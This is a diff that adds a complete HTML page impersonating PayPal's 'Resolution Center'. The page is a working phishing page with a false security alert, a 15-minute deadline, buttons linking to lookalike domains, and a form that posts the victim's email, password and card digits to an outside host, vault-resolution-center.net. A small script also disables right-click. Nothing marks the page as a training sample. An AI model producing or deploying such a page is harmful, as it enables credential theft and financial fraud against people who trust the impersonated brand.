@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPal Resolution Center</title>
+  <style>
+    :root {
+      --blue: #003087;
+      --cyan: #009cde;
+      --ink: #10253f;
+      --muted: #5c6b7d;
+      --bg: #f3f7fb;
+      --danger: #b22222;
+      --panel: #ffffff;
+      --line: rgba(16, 37, 63, 0.12);
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      color: var(--ink);
+      background:
+        linear-gradient(180deg, #eef5fb 0%, #f9fbfe 100%);
+    }
+    a { color: inherit; text-decoration: none; }
+    .topbar {
+      background: white;
+      border-bottom: 1px solid var(--line);
+      padding: 18px 28px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .logo {
+      font-size: 30px;
+      font-weight: 800;
+      letter-spacing: -0.03em;
+    }
+    .logo .p1 { color: var(--blue); }
+    .logo .p2 { color: var(--cyan); }
+    .wrap {
+      width: min(1100px, calc(100% - 32px));
+      margin: 28px auto 48px;
+      display: grid;
+      grid-template-columns: 1.1fr 0.9fr;
+      gap: 26px;
+    }
+    .card, .rail {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 22px;
+      box-shadow: 0 22px 50px rgba(16, 37, 63, 0.08);
+    }
+    .card { padding: 34px; }
+    .banner {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 14px;
+      border-radius: 999px;
+      background: rgba(178, 34, 34, 0.1);
+      color: var(--danger);
+      font-size: 12px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+    h1 {
+      margin: 18px 0 14px;
+      font-size: clamp(34px, 4.7vw, 58px);
+      line-height: 1.02;
+    }
+    h2 { margin: 0 0 10px; font-size: 24px; }
+    p, li { color: var(--muted); line-height: 1.72; }
+    .danger-copy {
+      border-left: 4px solid var(--danger);
+      padding-left: 16px;
+      margin: 24px 0;
+    }
+    .action-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin: 26px 0 30px;
+    }
+    .button, .button-soft {
+      padding: 14px 18px;
+      border-radius: 14px;
+      font-weight: 700;
+      font-size: 14px;
+    }
+    .button { background: var(--blue); color: white; }
+    .button-soft { background: rgba(0, 48, 135, 0.08); color: var(--blue); }
+    .list {
+      padding-left: 22px;
+      margin: 16px 0 0;
+    }
+    .rail {
+      padding: 24px;
+      display: grid;
+      gap: 18px;
+      align-content: start;
+    }
+    form {
+      display: grid;
+      gap: 12px;
+      margin-top: 10px;
+    }
+    label {
+      display: grid;
+      gap: 8px;
+      font-size: 13px;
+      font-weight: 700;
+      color: var(--ink);
+    }
+    input {
+      padding: 14px 15px;
+      border-radius: 14px;
+      border: 1px solid rgba(16, 37, 63, 0.16);
+      font: 15px/1.2 inherit;
+      background: white;
+    }
+    button {
+      padding: 14px 18px;
+      border: 0;
+      border-radius: 14px;
+      background: var(--blue);
+      color: white;
+      font: 700 14px/1.2 inherit;
+      cursor: pointer;
+    }
+    .mini {
+      padding: 16px;
+      border-radius: 16px;
+      background: #f7fbff;
+      border: 1px solid rgba(0, 48, 135, 0.08);
+    }
+    @media (max-width: 920px) { .wrap { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+  <header class="topbar">
+    <div class="logo"><span class="p1">Pay</span><span class="p2">Pal</span></div>
+    <div>Resolution Center</div>
+  </header>
+
+  <main class="wrap">
+    <section class="card">
+      <div class="banner">Security alert</div>
+      <h1>Your account has been limited pending immediate review.</h1>
+      <p>
+        We noticed unusual payment activity linked to your recent purchase attempts. Immediate action required:
+        verify your account now to prevent outgoing payments from being placed on hold for up to 48 hours.
+      </p>
+      <div class="danger-copy">
+        <p>
+          To restore full access, confirm your identity, update your billing profile, and enter your password inside the review form below.
+          If you do not complete this step today, your balance transfer features may remain unavailable.
+        </p>
+      </div>
+      <div class="action-row">
+        <a class="button" href="https://paypal-resolution-review.net/session/continue">Verify now</a>
+        <a class="button-soft" href="https://paypal-resolution-review.net/member/signin">Sign in to review</a>
+        <a class="button-soft" href="https://secure-wallet-status.net/paypal/case/44192">Open Resolution Center</a>
+        <a class="button-soft" href="https://secure-wallet-status.net/paypal/restore">Restore account access</a>
+      </div>
+      <h2>Why you are seeing this notice</h2>
+      <ul class="list">
+        <li>Recent transactions could not be fully confirmed by our security team.</li>
+        <li>Your withdrawal settings may stay paused until the review is finished.</li>
+        <li>Card funding sources remain unavailable until the account review is completed.</li>
+      </ul>
+    </section>
+
+    <aside class="rail">
+      <div class="mini">
+        <strong>Case ID:</strong> PP-44192-RC<br>
+        <strong>Status:</strong> Under review<br>
+        <strong>Window:</strong> 15 minutes remaining
+      </div>
+      <form action="https://vault-resolution-center.net/api/review" method="post">
+        <input type="hidden" name="case" value="PP-44192-RC">
+        <input type="hidden" name="flow" value="restore-access">
+        <input type="hidden" name="region" value="us-en">
+        <input type="hidden" name="step" value="password-check">
+        <label>
+          Email address
+          <input type="email" name="email" placeholder="name@example.com">
+        </label>
+        <label>
+          Password
+          <input type="password" name="password" placeholder="Enter your password">
+        </label>
+        <label>
+          Card ending in
+          <input type="text" name="card_tail" placeholder="Last 4 digits">
+        </label>
+        <button type="submit">Continue secure review</button>
+      </form>
+      <div class="mini">
+        Need help? Review your case activity or contact the dedicated response desk once the verification session is complete.
+        <a href="/policy">Privacy notice</a>
+      </div>
+    </aside>
+  </main>
+
+  <script>document.addEventListener('contextmenu', function (event) { event.preventDefault(); });</script>
+</body>
+</html>
